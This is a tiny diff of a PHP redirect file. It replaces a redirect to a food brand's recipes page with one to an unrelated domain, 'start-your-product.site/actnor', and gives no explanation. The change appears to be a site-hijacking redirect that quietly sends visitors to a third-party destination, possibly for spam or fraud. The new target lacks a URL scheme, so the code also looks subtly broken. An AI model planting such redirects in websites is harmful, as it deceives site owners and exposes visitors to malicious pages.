@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.yeovalley.co.uk/recipes/");
+header("Location: start-your-product.site/actnor");
 die();
 ?>
